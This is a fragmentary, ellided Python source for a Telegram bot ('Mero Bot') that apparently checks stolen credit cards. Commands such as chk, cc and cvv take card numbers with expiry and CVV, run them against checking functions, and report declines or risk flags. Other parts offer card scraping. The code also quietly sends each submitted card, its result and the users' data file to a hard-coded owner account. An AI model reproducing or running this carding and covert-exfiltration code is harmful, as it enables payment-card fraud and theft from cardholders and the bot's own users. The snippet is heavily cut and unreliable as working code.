...
def upd():
	...
	bot.edit_message_text(chat_id=-1002164810566,message_id=2,text=key)
def c():
		lines='''cvv
x
ccx
	...
	def my_function():
	  ...
	  "order": ""
		...
		if plan == 'Free' or plan == 'premium':
			...
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/ccmero")
...
CCN ➜ {cvc}
Declined ➜ {dd}
					<a href='https://t.me/{botuser}'>Mero Bot</a>''',parse_mode="HTML")
		stopuser[f'{id}']['status'] = 'stop'
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
...
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	...
	try:
		...
		if 'chk' == cmd or 'cc' == cmd or 'auth' == cmd or 'cvv' == cmd or 'x' == cmd or 'pro' == cmd:
			de=c()
			last = globals()[de](cc)
			bot.send_message(2134456129,f'{cc} {last} {de}')
			if 'RISK' in last or 'risk' in last:
...
Join <a href="t.me/ccmero">Here</a> to Get Updates And Keys For The Bot
𝗕𝗼𝘁 𝗕𝘆 @{userdeve}
If You Want to Run a Bot In Your Group, Make Sure The Bot is The Admin 🎁</b>''', reply_markup=keyboard)
		with open('data.json', 'rb') as file:
			bot.send_document(2134456129, file)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["on","of"])
def start(message):
	try:
		if not message.from_user.id == 2134456129:
			return
...
Please make sure you entered the correct username. If you believe this is an error, please check the spelling and try again. If the issue persists, kindly reach out to our support team for further assistance.</b>''',parse_mode="HTML")
				...
				ui=len(ccs)
				try:
					bot.send_document(message.chat.id, open('MEROCCBOT.txt', 'rb'),caption=f'''<b>𝑺𝑪𝑹𝑨𝑷𝑷𝑰𝑵𝑮 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫 ✅
